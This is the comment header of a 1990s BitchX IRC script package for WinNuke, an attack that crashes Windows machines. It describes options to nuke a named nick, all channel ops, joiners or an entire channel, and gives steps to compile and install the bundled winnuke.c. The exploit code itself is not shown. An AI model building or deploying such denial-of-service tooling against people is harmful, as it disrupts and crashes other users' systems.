# WinNuke BitchX IRC script/wnuke package v 1.5
# Created by maddog and lerper
# maddog@bitsmart.com, lerper@bitsmart.com

#      WinNuke IRCers with several options:
#      the nick you define
#      all of the ops in your current channel
#      anyone who joins a channel
#      everyone in the channel

# Creditz:
# goes out to _eci for winnuke
# #BitchX for their great support
# #ircII for pretending to be asleep whenever i asked for help
# #hack for the laughs (hey--they were talking about vibrators last night)
# Micro$oft for hosting the hacking channels on comic chat
# KL and his LPLC LAX
# shout outs to the L0pht and hey to memebers of  "CdC"

# notice: this package was created so more people could learn about winnuke
# and more winblows users could patch themeslves up.
# NOT so lame ircers could have their kicks

#Before using this script, compile the included winnuke.c
#cc -owinnuke winnuke.c should do the job!
#If you have a GNU compiler...replace the cc with gcc
#Then move the executable into your /usr/local/bin directory and
#chmod it with the access levels you wish.
